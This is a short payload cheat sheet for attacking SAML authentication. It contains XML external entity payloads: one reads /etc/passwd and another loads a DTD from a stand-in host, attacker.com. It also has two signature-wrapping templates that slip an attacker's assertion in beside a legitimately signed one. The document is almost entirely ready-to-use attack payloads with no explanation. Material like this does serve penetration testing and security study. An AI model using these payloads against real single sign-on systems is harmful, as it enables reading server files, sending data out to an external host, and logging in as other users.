# SAML Injection Payloads

## ========================================
## BASIC SAML STRUCTURE
## ========================================

# SAML Response skeleton
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol">
  <saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">
    <saml:Subject>
      <saml:NameID>user@example.com</saml:NameID>
    </saml:Subject>
  </saml:Assertion>
</samlp:Response>

## ========================================
## XXE IN SAML
## ========================================

# XML External Entity
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol">
  <saml:Issuer>&xxe;</saml:Issuer>
</samlp:Response>

# XXE via DTD
<!DOCTYPE foo [
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
]>

## ========================================
## SIGNATURE WRAPPING (XSW)
## ========================================

# XSW Attack #1 - Copy signed assertion
<samlp:Response>
  <saml:Assertion ID="original">
    <Signature>...</Signature>
    <saml:Subject>victim@example.com</saml:Subject>
  </saml:Assertion>
  <saml:Assertion ID="evil">
    <saml:Subject>attacker@evil.com</saml:Subject>
  </saml:Assertion>
</samlp:Response>

# XSW Attack #2 - Extensions wrapping
<samlp:Response>
  <saml:Extensions>
    <saml:Assertion ID="evil">
      <saml:Subject>attacker@evil.com</saml:Subject>
    </saml:Assertion>
  </saml:Extensions>
  <saml:Assertion ID="original">
    <Signature>...</Signature>
  </saml:Assertion>
</samlp:Response>
